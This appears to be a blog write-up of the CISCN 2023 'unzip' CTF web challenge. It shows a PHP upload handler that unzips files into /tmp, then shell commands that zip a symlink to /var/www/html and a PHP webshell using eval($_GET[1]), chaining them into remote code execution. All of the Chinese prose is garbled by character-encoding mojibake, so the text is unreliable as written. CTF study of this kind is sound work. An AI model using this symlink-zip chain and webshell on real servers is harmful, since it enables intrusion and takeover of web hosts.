---
title: ciscn2023 webéƒ¨åˆ†
date: 2024-11-25 20:28:13
permalink: /pages/0e353f/
author: 
  name: Cola
  link: https://the0n3.top
---
å­¦ä¹ ä¸‹ciscn2023 webéƒ¨åˆ†

<!-- more -->

## unzip

å¤ç°åœ°å€[ctfshow ciscn2023 unzip](https://ctf.show/challenges#Unzip-4002)

å°è¯•ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡ï¼Œä¸Šä¼ æ¥å£è¿”å›å¤„ç†çš„æºç 

![1](https://the0n3.top/medias/ciscn2023/1.png)

```php
<?php
# è·å–æ–‡ä»¶MIMEç±»å‹
$finfo = finfo_open(FILEINFO_MIME_TYPE);
# éªŒè¯MEMEç±»å‹ï¼Œåˆ¤æ–­æ–‡ä»¶ç±»å‹æ˜¯å¦ä¸ºzip
if (finfo_file($finfo, $_FILES["file"]["tmp_name"]) === 'application/zip'){
# ç§»åŠ¨åˆ°tmpç›®å½•ï¼Œè§£å‹åœ¨ä¸´æ—¶ç›®å½•é‡Œä¸Šä¼ çš„zipæ–‡ä»¶
    exec('cd /tmp && unzip -o ' . $_FILES["file"]["tmp_name"]);
};
```

åˆ†æä¸€ä¸‹ï¼š

- ä¸Šä¼ zipæ–‡ä»¶ï¼Œè§£å‹åˆ°`/tmp`ç›®å½•
- `unzip -o`å‚æ•°ï¼Œå¦‚æœzipæ–‡ä»¶ä¸­å­˜åœ¨åŒåæ–‡ä»¶ï¼Œåˆ™è¦†ç›–

é€šè¿‡ä¸Šé¢ä¸¤æ­¥æ“ä½œï¼Œå¯ä»¥å’Œlinux`è½¯é“¾æ¥`ç»“åˆèµ·æ¥å®ç°ä»¥ä¸‹åŠŸèƒ½ï¼š

- åˆ›å»ºä¸€ä¸ªè½¯é“¾æ¥æ–‡ä»¶`link`ï¼ŒæŒ‡å‘ç½‘ç«™æ ¹ç›®å½•`/var/www/html`ï¼Œå‹ç¼©ä¸Šä¼ 
- åˆ›å»ºåŒåæ–‡ä»¶å¤¹`link`ï¼Œåœ¨æ–‡ä»¶å¤¹é‡Œåˆ›å»ºæœ¨é©¬æ–‡ä»¶ï¼Œåœ¨ä½¿åœ¨è§£å‹åèƒ½å¤Ÿè¦†ç›–`link`æ–‡ä»¶å³`/var/www/html`ç›®å½•ï¼Œå¯ä»¥å®ç°æŠŠæœ¨é©¬è§£å‹åˆ°`/var/www/html`ç›®å½•getshell

åœ¨ç¬¬ä¸€æ­¥åˆ›å»º`link`è½¯è¿æ¥æ–‡ä»¶å‹ç¼©åï¼Œ**è®°å¾—åˆ é™¤ï¼Œå¦åˆ™æ— æ³•åˆ›å»ºåŒåæ–‡ä»¶å¤¹`link`**ï¼Œæ˜¯å¦ä¸€å®šè¦åŒåæ–‡ä»¶å¤¹ï¼Ÿæ˜¯ï¼Œå¦åˆ™å‰é¢åˆ›å»ºçš„è½¯è¿æ¥æ²¡æœ‰æ„ä¹‰

æ¼”ç¤ºï¼š

åœ¨æœ¬åœ°åˆ›å»º`link`è½¯è¿æ¥æ–‡ä»¶ï¼ŒæŒ‡å‘`/var/www/html`ç›®å½•

```bash
# åˆ›å»ºè½¯è¿æ¥
ln -s /var/www/html link
# å‹ç¼©
zip --symlinks link.zip link
```

![2](https://the0n3.top/medias/ciscn2023/2.png)

åˆ é™¤`link`è½¯è¿æ¥æ–‡ä»¶ï¼Œåˆ›å»ºåŒåæ–‡ä»¶å¤¹`link`ï¼Œåœ¨æ–‡ä»¶å¤¹é‡Œåˆ›å»º`shell.php`æ–‡ä»¶

```bash
# åˆ é™¤è½¯è¿æ¥
rm link
# åˆ›å»ºæ–‡ä»¶å¤¹ï¼Œè¿›å…¥
mkdir link
cd link
# å†™ä¸ªğŸå­
echo '<?php highlight_file(__FILE__);eval($_GET[1]);phpinfo();?>' > shell.php
# ç§»åŠ¨åˆ°ä¸Šä¸€çº§ï¼Œå‹ç¼©
zip -r link1.zip ./link/*
```

![3](https://the0n3.top/medias/ciscn2023/3.png)

ç°åœ¨ï¼Œå¯ä»¥å…ˆä¸Šä¼ `link.zip`æ–‡ä»¶ï¼Œå®ç°è§£å‹åçš„`link`é“¾æ¥åˆ°`/var/www/html`ç›®å½•ï¼Œå†ä¸Šä¼ `link1.zip`æ–‡ä»¶ï¼ŒæŠŠå†™å¥½çš„æœ¨é©¬ç›´æ¥è§£å‹åˆ°`/var/www/html`ç›®å½•getshellï¼Œå¦‚æœæœ¨é©¬æ–‡ä»¶åä¸º`upload.php`,`index.php`åº”è¯¥è¿˜å¯ä»¥è¦†ç›–åŸæ–‡ä»¶

è®¿é—®æœ¨é©¬è·¯å¾„

![4](https://the0n3.top/medias/ciscn2023/4.png)



å‚è€ƒã€è‡´è°¢ï¼š

- [ã€CISCN2023ã€‘unzip è¯¦è§£](https://www.cnblogs.com/gxngxngxn/p/17439035.html)
- [ä¸€ä¸ªæœ‰è¶£çš„ä»»æ„æ–‡ä»¶è¯»å–](https://xz.aliyun.com/t/2589?time__1311=n4%2Bxni0%3DG%3Di%3D0QAeGNDQTcqYqeGTZxY5vd4x)
- [ctfshow](https://ctf.show)